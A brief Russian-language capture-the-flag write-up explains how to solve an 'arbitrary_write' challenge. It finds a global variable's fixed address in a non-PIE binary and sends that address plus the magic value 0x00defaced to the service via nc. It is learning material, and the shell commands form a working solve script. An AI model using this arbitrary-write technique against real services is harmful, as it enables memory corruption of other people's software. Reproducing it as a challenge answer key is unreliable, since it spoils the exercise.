# arbitrary_write — writeup

## Идея
Есть глобальная переменная:

```c
uint32_t VAR;
```

Флаг выдается, если:

```
VAR == 0x00defaced
```

Программа позволяет сделать **произвольную запись** `*(uint32_t*)addr = value`.

## Решение
Нужно найти адрес `VAR` в бинаре (он без PIE, поэтому адрес фиксированный), и записать туда `0x00defaced`.

### Найти адрес `VAR`

```bash
nm -n arbitrary_write | grep ' VAR$'
# или
objdump -t arbitrary_write | grep ' VAR$'
```

### Записать значение
Отправляем два значения:
1) `addr` в hex
2) `value` в hex

Пример:

```bash
ADDR=$(nm -n arbitrary_write | awk '$3=="VAR"{print "0x"$1; exit}')
(echo "$ADDR"; echo 0x00defaced) | nc <host> <port>
```
